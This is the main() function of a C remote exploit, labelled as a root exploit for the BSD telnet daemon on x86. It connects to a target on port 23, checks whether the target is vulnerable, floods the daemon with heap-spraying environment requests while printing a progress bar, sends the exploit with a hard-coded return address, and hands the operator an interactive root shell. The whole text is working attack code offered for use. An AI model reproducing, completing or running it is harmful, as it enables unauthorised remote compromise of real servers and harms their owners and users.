int
main (int argc, char *argv[])
{
        char                    c;
        char *                  progname;
        char *                  dest;
        int                     i, j, fd,
                                dots = 0;
        int                     popc;
        struct timeval          start,
                                cur;
        unsigned long long int  g_pct,  /* gaussian percentage */
                                g_all;  /* gaussian overall */


        fprintf (stderr, "7350854 - x86/bsd telnetd remote root\n"
                "by zip, lorian, smiler and scut.\n\n");

        progname = argv[0];
        if (argc < 2)
                usage (progname);


        while ((c = getopt (argc, argv, "n:cf")) != EOF) {
                switch (c) {
                case 'n':
                        num = atoi (optarg);
                        break;
                case 'c':
                        checkonly = 1;
                        break;
                case 'f':
                        force = 1;
                        break;
                default:
                        usage (progname);
                        break;
                }
        }

        dest = argv[argc - 1];
        if (dest[0] == '-')
                usage (progname);

        fd = net_connect (NULL, dest, 23, 20);
        if (fd <= 0) {
                fprintf (stderr, "failed to connect\n");
                exit (EXIT_FAILURE);
        }

        random_init ();

        if (xp_check (fd) == 0 && force == 0) {
                printf ("aborting\n");
#ifndef DEBUG
                exit (EXIT_FAILURE);
#endif
        }
        close (fd);

        if (checkonly)
                exit (EXIT_SUCCESS);

        fd = net_connect (NULL, dest, 23, 20);
        if (fd <= 0) {
                fprintf (stderr, "failed to connect the second time\n");
                exit (EXIT_FAILURE);
        }

        printf ("\n#############################################################################\n\n");
        printf ("ok baby, times are rough, we send %dmb traffic to the remote\n"
                "telnet daemon process, it will spill badly. but then, there is no\n"
                "other way, sorry...\n\n", mode);

#ifdef DEBUG
        getchar ();
#endif
        printf ("## setting populators to populate heap address space\n");

        g_all = ((unsigned long long int)(pop / 2)) *
                        ((unsigned long long int)(pop + 1));
        g_pct = 0;

        printf ("## number of setenvs (dots / network): %d\n", pop);
        printf ("## number of walks (percentage / cpu): %Lu\n", g_all);
        printf ("##\n");
        printf ("## the percentage is more realistic than the dots ;)\n");
        printf ("\n");
        printf ("percent |");

        popc = pop / COL;
        for (i = pop / popc ; i >= 0 ; --i)
                printf ("-");
        printf ("|      ETA |\n");

        gettimeofday (&start, NULL);

        for (walk = 0 ; walk < pop ; ++walk) {
                xp_pop (fd);

                g_pct += walk;

                if (walk % popc == 0)
                        dots += 1;

                if (walk % 200 == 0) {
                        int                     pct;
                        float                   pct_f;
                        unsigned long int       diff;

                        pct = (int) ((g_pct * 100) / g_all);
                        pct_f = g_pct * 100;
                        pct_f /= (float) g_all;

                        /* calculate difference not caring about accuracy */
                        gettimeofday (&cur, NULL);
                        diff = cur.tv_sec - start.tv_sec;

                        printf ((pct == 100) ? "\r%3.2f%% |" : ((pct / 10) ?
                                "\r %2.2f%% |" : "\r  %1.2f%% |"), pct_f);
                        for (j = 0 ; j < dots ; ++j)
                                printf (".");
                        for ( ; j <= COL ; ++j)
                                printf (" ");

                        if (pct != 0) {
                                diff = (int) ((((float)(100 - pct_f)) /
                                        (float) pct_f) * diff);
                                printf ("| %02lu:%02lu:%02lu |",
                                        diff / 3600, (diff % 3600) / 60,
                                        diff % 60);
                        } else {
                                printf ("| --:--:-- |");
                        }

                        fflush (stdout);
                }
        }
        printf ("\n\n");

        printf ("## sleeping for 10 seconds to let the process recover\n");
        sleep (10);

#ifdef DEBUG
        getchar ();
#endif
        /* return into 0x08feff0a */
        xp (fd);
        sleep (1);

        printf ("## ok, you should now have a root shell\n");
        printf ("## as always, after hard times, there is a reward...\n");
        printf ("\n\ncommand: ");
        fflush (stdout);

        shell (fd);

        exit (EXIT_SUCCESS);
}